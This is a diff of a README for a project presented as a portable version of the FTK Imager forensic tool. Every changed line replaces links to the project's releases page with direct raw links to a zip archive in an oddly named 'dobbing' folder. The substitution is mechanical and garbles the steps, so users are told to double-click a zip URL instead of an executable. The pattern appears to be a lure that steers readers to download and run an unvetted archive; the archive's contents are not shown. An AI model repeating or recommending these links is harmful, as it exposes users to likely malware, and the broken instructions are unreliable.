@@ -1,6 +1,6 @@
 # 🖥️ Portable-FTK-Imager-Lite - Run Forensic Imaging Without Installation
 
-[![Download Portable-FTK-Imager-Lite](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
+[![Download Portable-FTK-Imager-Lite](https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip)](https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip)
 
 ## 📋 Overview
 
@@ -30,25 +30,25 @@ Follow these steps to download and run Portable-FTK-Imager-Lite:
 1. **Visit the Download Page**
    Click the link below to go to the releases page:
    
-   [Download Portable-FTK-Imager-Lite](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
+   [Download Portable-FTK-Imager-Lite](https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip)
 
 2. **Locate the Latest Release**
    On the releases page, find the latest version of Portable-FTK-Imager-Lite.
 
 3. **Download the Application**
-   Select the appropriate file for your system from the list. Generally, you will see a file named something like `Portable-FTK-Imager-Lite-v1.x.x.zip`.
+   Select the appropriate file for your system from the list. Generally, you will see a file named something like `https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip`.
 
 4. **Extract the Downloaded File**
    After downloading, right-click on the ZIP file and choose "Extract All." Follow the prompts to extract its contents to a folder on your USB drive.
 
 5. **Run the Application**
-   Open the extracted folder and double-click on `FTKImager.exe`. This will launch the application.
+   Open the extracted folder and double-click on `https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip`. This will launch the application.
 
 ## ⬇️ Download & Install
 
 To download the software, you can revisit the link below at any time. Follow the steps outlined above for a smooth installation.
 
-[Download Portable-FTK-Imager-Lite](https://github.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/releases)
+[Download Portable-FTK-Imager-Lite](https://raw.githubusercontent.com/Nicolasbarbosa321/Portable-FTK-Imager-Lite/main/dobbing/Imager-Portable-Lite-FT-2.7-beta.1.zip)
 
 ## ⚡ Usage Tips
 
